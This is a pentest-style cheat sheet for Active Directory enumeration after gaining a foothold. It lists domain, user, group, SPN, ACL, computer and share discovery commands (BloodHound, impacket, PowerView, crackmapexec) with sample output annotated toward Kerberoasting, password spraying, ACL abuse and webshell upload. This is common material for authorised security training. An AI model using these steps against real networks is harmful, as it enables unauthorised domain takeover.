# AD ENUMERATION (FROM FOOTHOLD)

### Identify domain

Confirm you're in a domain — Starting point for AD attacks

```bash
systeminfo | findstr /B Domain
echo %userdomain%
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

<details>
<summary>Example Output</summary>

```
systeminfo | findstr Domain
Domain: corp.local
Logon Server: \\DC01

echo %userdomain%
CORP
```
</details>

---

### Domain controller IP

Identify the DC — Primary target

```bash
nltest /dclist:<domain>
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>
```

<details>
<summary>Example Output</summary>

```
nltest /dclist:corp.local
  DC01.corp.local [PDC] [DS] Site: Default
  Address: \\10.10.10.5
(DC IP identified for targeting)
```
</details>

---

### Domain users

All domain users — Build target list

```bash
net user /domain
Get-ADUser -Filter * | Select SamAccountName
```

<details>
<summary>Example Output</summary>

```
net user /domain
Administrator    Guest    krbtgt
john.smith       svc_sql  admin.backup
svc_web          jane.doe helpdesk
```
</details>

---

### Domain groups

Groups and membership — Who is Domain Admin?

```bash
net group /domain
net group 'Domain Admins' /domain
```

<details>
<summary>Example Output</summary>

```
net group 'Domain Admins' /domain
Members:
  Administrator  john.smith  svc_admin
(3 Domain Admins - these are our targets)
```
</details>

---

### Domain password policy

Lockout threshold, complexity — Guides password spray rate

```bash
net accounts /domain
```

<details>
<summary>Example Output</summary>

```
net accounts /domain
Lockout threshold: 5
Lockout duration: 30 min
Minimum password length: 7
(5 attempts before lockout, spray carefully)
```
</details>

---

### BloodHound collection

Graph AD relationships — Visual attack path finder

```bash
.\SharpHound.exe -c All
or: bloodhound-python -d <domain> -u <user> -p <pass> -ns <DC_IP> -c All
```

<details>
<summary>Example Output</summary>

```
.\SharpHound.exe -c All
Initializing SharpHound
Resolved: corp.local
Collected 847 objects
Zip: 20260224_BloodHound.zip
(Upload zip to BloodHound GUI)
```
</details>

---

### BloodHound analysis

Query pre-built attack paths — Shows exactly how to escalate

```bash
Upload .zip to BloodHound GUI
Run: Shortest Path to Domain Admins
Run: Find AS-REP Roastable Users
Run: Find Kerberoastable Users
```

<details>
<summary>Example Output</summary>

```
Upload zip -> Queries:
'Shortest Path to Domain Admins':
john -> GenericAll -> svc_admin -> Domain Admins

'Kerberoastable Users':
svc_sql (SPN: MSSQLSvc/DB01)
(Visual attack path to DA)
```
</details>

---

### Enum SPNs

Service accounts with SPNs — Kerberoast targets

```bash
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName
or: impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP>
```

<details>
<summary>Example Output</summary>

```
impacket-GetUserSPNs corp.local/john:Password1 -dc-ip 10.10.10.5
SPN                    Name        
MSSQLSvc/DB01:1433     svc_sql
HTTP/WEB01             svc_web
(These accounts are Kerberoastable)
```
</details>

---

### Enum ACLs

Who has rights over what — GenericAll, WriteDACL, etc = takeover

```bash
Find-InterestingDomainAcl (PowerView)
or: BloodHound edge analysis
```

<details>
<summary>Example Output</summary>

```
PowerView:
Find-InterestingDomainAcl

john.smith has GenericAll over svc_admin
IT-Support group has WriteDACL over Domain Admins
(ACL abuse = privilege escalation path)
```
</details>

---

### Enum computers

All domain computers — Find targets, old OS versions

```bash
Get-ADComputer -Filter * | Select Name,OperatingSystem
```

<details>
<summary>Example Output</summary>

```
Get-ADComputer -Filter * | Select Name,OperatingSystem
DC01     Windows Server 2019
WEB01    Windows Server 2019
DB01     Windows Server 2016
WIN10-1  Windows 10 Pro
(DB01 on 2016 = more exploit options)
```
</details>

---

### Shares across domain

Enum all SMB shares — Find sensitive files

```bash
crackmapexec smb <subnet>/24 --shares -u <user> -p <pass>
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.0/24 --shares -u john -p Password1
10.10.10.5   DC01    Backups(READ) SYSVOL(READ)
10.10.10.20  WEB01   wwwroot(READ,WRITE)
10.10.10.21  DB01    SQLBackups(READ)
(WRITE on wwwroot = upload webshell)
```
</details>

---
